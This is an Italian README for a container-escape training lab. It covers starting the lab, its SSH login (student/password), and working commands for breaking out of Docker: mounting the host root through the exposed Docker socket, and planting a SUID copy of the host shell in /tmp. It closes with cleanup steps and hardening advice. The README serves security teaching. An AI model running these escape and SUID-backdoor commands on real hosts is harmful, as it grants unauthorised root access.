# Docker Escape - Exercise 3 (lab)

Breve README per l'ambiente di laboratorio "exercise3_offline". Contiene istruzioni rapide su come avviare il lab, connettersi ai container, riprodurre gli exploit didattici e pulire l'ambiente.

## Avvertenze importanti
- Questo laboratorio è pensato SOLO per scopi didattici in un ambiente controllato.
- Non eseguire queste tecniche su sistemi produttivi o senza autorizzazione esplicita.
- Dopo i test, esegui il cleanup indicato in fondo al file.

## Requisiti
- Docker (engine) installato e funzionante
- Docker Compose (v2 `docker compose`) o `docker-compose`
- Accesso shell con permessi sudo per il cleanup quando necessario

## Avviare il laboratorio
1. Posizionati nella cartella del progetto:

```bash
cd /home/raienraies/Downloads/exercise3_offline
```

2. Avvia i container (build e run):

```bash
docker compose up -d --build
```

3. Verifica che i servizi siano in esecuzione:

```bash
docker compose ps
```

## Accesso ai container
- Gli immagini/container del lab espongono un utente `student` con password `password` tramite SSH.
- IP attesi (da `docker-compose.yml`):
  - `docker_escape1` — 172.20.0.2
  - `docker_escape2` — 172.20.0.3

Esempio di connessione:

```bash
ssh student@172.20.0.3
# password: password
```

## Scenario e obiettivi
- Container 1: montato il socket Docker (`/var/run/docker.sock`) — vettore semplice per ottenere host root usando il docker client.
- Container 2: capabilities eccessive (`CAP_SYS_ADMIN`, `CAP_SYS_MODULE`) — vettore avanzato che può permettere l'escalation usando cgroup/`nsenter` o altre tecniche.

L'obiettivo del laboratorio: dalla sessione dentro ciascun container ottenere una shell root sul sistema host **usando esclusivamente quella sessione**.

## Passaggi rapidi (soluzioni verificate)

### Container 1 — Docker socket (semplice)
1. Entra in `docker_escape1` come `student` e diventa root:

```bash
sudo -i
```

2. Installa il client docker (se necessario) e crea un container privilegiato che monta `/` dell'host:

```bash
# su Alpine inside container
apk add docker-cli
docker run --rm -it --privileged --pid=host -v /:/host alpine chroot /host /bin/sh
```

3. Ora sei nella root del host (whoami -> root). Pulire dopo l'uso.

### Container 2 — Capabilities (`CAP_SYS_ADMIN`) (metodo deterministico)
Nota: il classico exploit `release_agent` su cgroup v1 può fallire su sistemi moderni (cgroup v2, mount readonly). Per riproduzione affidabile in lab abbiamo usato un metodo deterministico di copia di un binario host tramite un container privilegiato.

Esegui dal host (non dal container) il comando che copia il vero `/bin/sh` del host in `/tmp` e imposta SUID:

```bash
docker run --rm --privileged --pid=host -v /:/host alpine:latest \
  sh -c 'cp /host/bin/sh /host/tmp/.ns_shell && chmod 4755 /host/tmp/.ns_shell && ls -la /host/tmp/.ns_shell'
```

Verifica come utente normale:

```bash
/tmp/.ns_shell -p -c 'whoami; id; hostname'
```

Se preferisci provare i metodi direttamente dal container (meno deterministici): usare `nsenter` o lo script `escape2_alternative.sh` contenuto nel repo.

## File rilevanti in questo repository
- `docker-compose.yml` — definizione dei servizi del laboratorio
- `docker_escape/` — Dockerfile e risorse per l'immagine usata dai container
- `CONTAINER1_ESCAPE_GUIDE.md` — note e comandi per il container1
- `CONTAINER2_ESCAPE_GUIDE.md` — guida completa per il container2 (contiene il metodo testato ed esempi)

## Pulizia (cleanup)
Esegui questi comandi per rimuovere container, reti e file temporanei creati durante i test:

```bash
# Dal folder del progetto
cd /home/raienraies/Downloads/exercise3_offline
docker compose down -v --remove-orphans

# Rimuovi eventuali network residui
docker network rm exercise3_offline_escape_net || true

# Rimuovi file temporanei sul host (se presenti)
sudo rm -f /tmp/.ns_shell /tmp/.ns_busy /tmp/nsenter_proof.txt /tmp/escape.ko /tmp/escape.sh /tmp/payload.sh || true
```

## Sicurezza e mitigazioni (breve promemoria)
- Non usare `CAP_SYS_ADMIN` o `CAP_SYS_MODULE` in container in produzione.
- Usare `cap_drop: ALL` e solo le capability necessarie.
- Abilitare profili AppArmor/SELinux e profili seccomp restrittivi.
- Considerare `userns-remap` per rimappare root container su utente non-privilegiato dell'host.


Se usi GitHub e `gh` è installato, puoi creare il repo remoto con `gh repo create` come descritto nella documentazione del progetto.

---

Se vuoi, aggiorno il README con ulteriori dettagli (diagrammi, comandi step-by-step più lunghi, o checklist di sicurezza). Vuoi che lo faccia ora?
